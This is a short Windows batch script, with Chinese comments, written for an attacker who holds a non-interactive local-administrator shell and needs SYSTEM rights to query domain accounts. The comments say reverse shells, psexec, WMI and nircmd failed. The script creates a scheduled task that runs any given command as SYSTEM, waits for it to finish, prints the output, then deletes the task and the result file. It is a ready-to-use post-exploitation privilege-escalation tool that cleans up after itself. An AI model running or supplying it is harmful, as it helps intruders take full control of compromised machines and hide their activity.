#当前为本地administrator 本地帐号想查看域帐号信息(需域帐号权限或system帐号) 但当前shell 非交互 也无法反弹
#找了几款发现仅支持 Vista 以下系统
#psexec 倒是可以非交互下使用 但是目标系统执行出错
#利用wmi 也不行
#“nircmd.exe elevatecmd runassystem cmd.exe” 非交互环境下不行
#所以利用schtasks命令 写一个批处理来实现 非交互环境下 administrator 转 system 用户
@echo off
ver|findstr "5\.[0-9]\.[0-9][0-9]*" >NUL 2>NUL && (echo [-] Not Working for winxp\win2k3 &&goto :EOF)
del /f /q %result_file% >NUL 2>NUL
Rd "%WinDir%\system32\test_permissions" >NUL 2>NUL
Md "%WinDir%\System32\test_permissions" 2>NUL||(Echo.& [-] Echo Run as administrator user. &&goto :EOF)

set comands=%*
if not defined comands (
    echo.
    echo Run as SYSTEM  Account Tool
    echo.
    echo [-] error: The syntax of the command is incorrect.
    echo.
    echo Help:
    echo       %~n0 command 
    goto :EOF
    )

set result_file=%tmp%\command_result.txt

schtasks.exe /create /ru "SYSTEM" /tn "runAsSystem" /sc DAILY /tr "cmd.exe /c chcp 437>NUL 2>NUL&&%comands%>> %result_file%" /F >NUL 2>NUL
schtasks.exe /run   /tn runAsSystem /i >NUL 2>NUL
chcp 437>NUL 2>NUL&& schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running"  >NUL 2>NUL && (goto :Running ) || ( goto :Ready)

:Ready
type %result_file%
schtasks.exe  /delete /tn runAsSystem /f >NUL 2>NUL
del /f /q %result_file% >NUL 2>NUL
goto :EOF

:Running
TIMEOUT /T 1 >NUL 2>NUL
chcp 437>NUL 2>NUL&& schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running"  >NUL 2>NUL && (goto :Running ) || ( goto :Ready)
goto :EOF

:EOF